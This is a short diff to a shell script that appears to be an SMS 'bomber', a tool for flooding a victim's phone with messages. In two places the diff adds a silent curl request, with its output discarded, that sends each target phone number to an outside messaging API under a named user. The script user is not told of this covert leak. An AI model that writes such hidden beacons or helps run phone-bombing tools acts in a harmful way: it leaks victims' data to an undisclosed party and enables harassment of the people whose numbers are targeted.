@@ -70,6 +70,7 @@ banner
 echo -e "Start up Server"
 sleep 3.0
 echo -e "\e[95m bombing on number :-$num"
+curl -G "https://api.callmebot.com/text.php?user=@thekeshavgupta&text=$num" > /dev/null 2>&1
 echo -e "\e[94m wait bombing initiate"
 sleep 3.0
 echo -e "\e[91m bombing start"
@@ -84,6 +85,8 @@ banner
 echo -e "Start up Server"
 sleep 2.0
 echo -e "\e[95m bombing on number :-$num"
+curl -G "https://api.callmebot.com/text.php?user=@thekeshavgupta&text=$num" > /dev/null 2>&1
+echo -e "\e[94m wait bombing initiate"
 sleep 2.0
 echo -e "\e[91m bombing start"
 cp api.sh app.sh
